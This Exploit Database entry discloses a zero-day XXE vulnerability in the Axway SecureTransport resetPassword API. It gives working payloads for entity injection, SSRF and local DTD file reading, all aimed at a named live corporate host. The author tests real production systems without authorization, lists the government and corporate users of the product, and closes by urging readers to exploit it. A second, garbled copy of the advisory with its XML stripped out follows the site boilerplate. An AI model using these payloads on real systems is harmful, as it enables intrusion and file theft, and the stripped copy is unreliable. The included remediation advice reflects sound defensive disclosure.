"Axway SecureTransport is a multi-protocol MFT gateway for securing, managing, and tracking file flows among people and applications inside your enterprise, and beyond your firewall to your user communities, the cloud and mobile devices. It is designed to handle everything — from high-volume automated high speed secure file transfers between systems, sites, lines of business and external partners, to user-driven communications and mobile, folder- and portal-based file sharing."

Who uses this software?

Well, to name a few... (just use the dork dude)
- Government of California
- Biometrics.mil
- Fleetcor
- Costco
- Boeing
- IRS

Description:
Axway SecureTransport versions 5.3 through 5.0 (and potentially others) are vulnerable to an unauthenticated blind XML injection (& XXE) vulnerability in the resetPassword functionality via the REST API. If executed properly, this vulnerablity can lead to local file disclosure, DOS or URI invocation attacks (e.g SSRF->RCE). It's worth noting that in version 5.4 the v1 API was deprecated... but not removed entirely. Meaning that you can still trigger this vulnerability on updated installations if they have the v1.0, v1.1, v1.2 or v1.3 in the /api/ directory.

Reproduction:

1. Breaking the parser.

	HTTP Request:
	```
	POST /api/v1.0/myself/resetPassword HTTP/1.1
	Host: securefile.costco.com
	Content-Type: application/xml
	Referer: localhost

	</email>
	```

	HTTP Response:
	```
	{
	  "message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 2; The markup in the document preceding the root element must be well-formed.]"
	}
	```

2. Verifying the vulnerability.

	HTTP Request:
	```
	POST /api/v1.0/myself/resetPassword HTTP/1.1
	Host: securefile.costco.com
	Content-Type: application/xml
	Referer: localhost

	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
	<!DOCTYPE resetPassword [
	<!ENTITY thisactuallyexists SYSTEM "file:///dev/null">
	]>
	<resetPassword><email>&thisactuallyexists;&thisdoesnt;</email></resetPassword>
	```

	HTTP Response:
	```
	{
	  "message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 48; The entity "thisdoesnt" was referenced, but not declared.]"
	}
	```

	As you can see, the parser recognizes that "thisactuallyexists" was in fact declared. In the same error, we see that "thisdoesn't" was referenced, but not declared. This demonstrates that we can declare arbitrary entities.

	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#detect-the-vulnerability

3. External Entity Injection (XXE) (hardened)

	NOTE: Because the server doesn't reflect the input anywhere, our only option is error-based XXE or out-of-band XXE. However, upon initial discovery, it appears as though most Axway SecureTransport installations have some type of firewall blocking all outgoing requests. This makes exploiting traditional XXE difficult. Judging by this, my only ideas on exploitation would be via blind SSRF or by repurposing an existing DTD on the filesystem to trigger an error with the file contents/result of our payload. However because I don't have a license, I can't effectively audit this software from a whitebox perspective, which makes mapping out internal attack surface difficult. The underlying vulnerability remains... but with restrictions.

	HTTP Request:
	```
	POST /api/v1.0/myself/resetPassword HTTP/1.1
	Host: securefile.costco.com
	Content-Type: application/xml
	Referer: localhost

	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
	<!DOCTYPE resetPassword [
	<!ENTITY ssrf SYSTEM "http://localhost/SOMETHING_I_WISH_I_KNEW_EXISTED?NEW_PASSWORD=1337" >
	]>
	<resetPassword><email>&ssrf;</email></resetPassword>
	```

	HTTP Response:
	```
	(empty)
	```

	Local DTD repurposing example request:
	```
	POST /api/v1.0/myself/resetPassword HTTP/1.1
	Host: securefile.costco.com
	Content-Type: application/xml
	Referer: localhost

	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
	<!DOCTYPE resetPassword [
	    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">

	    <!ENTITY % expr 'aaa)>
	        <!ENTITY &#x25; file SYSTEM "file:///FILE_TO_READ">
	        <!ENTITY &#x25; eval "<!ENTITY &#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
	        &#x25;eval;
	        &#x25;error;
	        <!ELEMENT aa (bb'>

	    %local_dtd;
	]>
	<resetPassword></resetPassword>

	```

4. More vulnerability-indicating errors:

	HTTP Request:
	```
	POST /api/v1.0/myself/resetPassword HTTP/1.1
	Host: securefile.costco.com
	Content-Type: application/xml
	Referer: localhost

	<?xml version="1.0" encoding="UTF-8" standalone="no"?>
	<!DOCTYPE resetPassword [
	<!ENTITY ssrf SYSTEM a >
	]>
	<resetPassword><email>&ssrf;</email></resetPassword>
	```

	HTTP Response:
	```
	{
	  "message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 22; The system identifier must begin with either a single or double quote character.]"
	}
	```

5. The original request

	HTTP Request:
	```
	POST /api/v1.0/myself/resetPassword HTTP/1.1
	Host: securefile.costco.com
	Content-Type: application/xml
	Referer: localhost

	<resetPassword><email>email@email.com</email></resetPassword>
	```

	HTTP Response:
	```
	(empty)
	```

Conclusion:

If a determined attacker were to get to know the Axway SecureTransport software, the chances of successfully chaining this bug are high. DTD repurposing is a relatively new technique, however in the near future we will be seeing a lot more of this attack vector due to XML parser restrictions/firewalled networks. I didn't feel comfortable doing further testing as I don't have a license, meaning I'm limited to testing against live targets. So for now, enjoy the 0day. Be creative.

Remediation:

In order to avoid this vulnerability, it's suggested to disable both doctype declaration and external general entities. You can find more information on that here: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#java

Notes:

- Referer must be set.
- Content type must be xml.
- Successful request returns a HTTP/1.1 204 No Content
- Any type of invalid XML throws an SAXParser exception.
- If external entities were disabled... we should also recieve an exception.
- Same with doctype declaration.
- API endpoints can vary from /api/v1.0, /api/v1.1, /api/v1.2, /api/v1.3, /api/v1.4

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

{
"message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 2; The markup in the document preceding the root element must be well-formed.]"
}
```
2. Verifying the vulnerability.
HTTP Request:
```
POST /api/v1.0/myself/resetPassword HTTP/1.1
Host: securefile.costco.com
Content-Type: application/xml
Referer: localhost
xml version="1.0" encoding="UTF-8" standalone="no"?

]>
&thisactuallyexists&thisdoesnt
```
HTTP Response:
```
{
"message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 5; columnNumber: 48; The entity "thisdoesnt" was referenced, but not declared.]"
}
```
As you can see, the parser recognizes that "thisactuallyexists" was in fact declared. In the same error, we see that "thisdoesn't" was referenced, but not declared. This demonstrates that we can declare arbitrary entities.

3. External Entity Injection (XXE) (hardened)
NOTE: Because the server doesn't reflect the input anywhere, our only option is error-based XXE or out-of-band XXE. However, upon initial discovery, it appears as though most Axway SecureTransport installations have some type of firewall blocking all outgoing requests. This makes exploiting traditional XXE difficult. Judging by this, my only ideas on exploitation would be via blind SSRF or by repurposing an existing DTD on the filesystem to trigger an error with the file contents/result of our payload. However because I don't have a license, I can't effectively audit this software from a whitebox perspective, which makes mapping out internal attack surface difficult. The underlying vulnerability remains... but with restrictions.
HTTP Request:
```
POST /api/v1.0/myself/resetPassword HTTP/1.1
Host: securefile.costco.com
Content-Type: application/xml
Referer: localhost
xml version="1.0" encoding="UTF-8" standalone="no"?

]>
&ssrf
```
HTTP Response:
```
(empty)
```
Local DTD repurposing example request:
```
POST /api/v1.0/myself/resetPassword HTTP/1.1
Host: securefile.costco.com
Content-Type: application/xml
Referer: localhost
xml version="1.0" encoding="UTF-8" standalone="no"?

">
%eval;
%error;

%local\_dtd;
]>

```
4. More vulnerability-indicating errors:
HTTP Request:
```
POST /api/v1.0/myself/resetPassword HTTP/1.1
Host: securefile.costco.com
Content-Type: application/xml
Referer: localhost
xml version="1.0" encoding="UTF-8" standalone="no"?

]>
&ssrf
```
HTTP Response:
```
{
"message" : "javax.xml.bind.UnmarshalException\n - with linked exception:\n[org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 22; The system identifier must begin with either a single or double quote character.]"
}
```
5. The original request
HTTP Request:
```
POST /api/v1.0/myself/resetPassword HTTP/1.1
Host: securefile.costco.com
Content-Type: application/xml
Referer: localhost
email@email.com
```
HTTP Response:
```
(empty)
```
Conclusion:
If a determined attacker were to get to know the Axway SecureTransport software, the chances of successfully chaining this bug are high. DTD repurposing is a relatively new technique, however in the near future we will be seeing a lot more of this attack vector due to XML parser restrictions/firewalled networks. I didn't feel comfortable doing further testing as I don't have a license, meaning I'm limited to testing against live targets. So for now, enjoy the 0day. Be creative.
Remediation:
In order to avoid this vulnerability, it's suggested to disable both doctype declaration and external general entities. You can find more information on that here: https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html#java
Notes:
- Referer must be set.
- Content type must be xml.
- Successful request returns a HTTP/1.1 204 No Content
- Any type of invalid XML throws an SAXParser exception.
- If external entities were disabled... we should also recieve an exception.
- Same with doctype declaration.
- API endpoints can vary from /api/v1.0, /api/v1.1, /api/v1.2, /api/v1.3, /api/v1.4
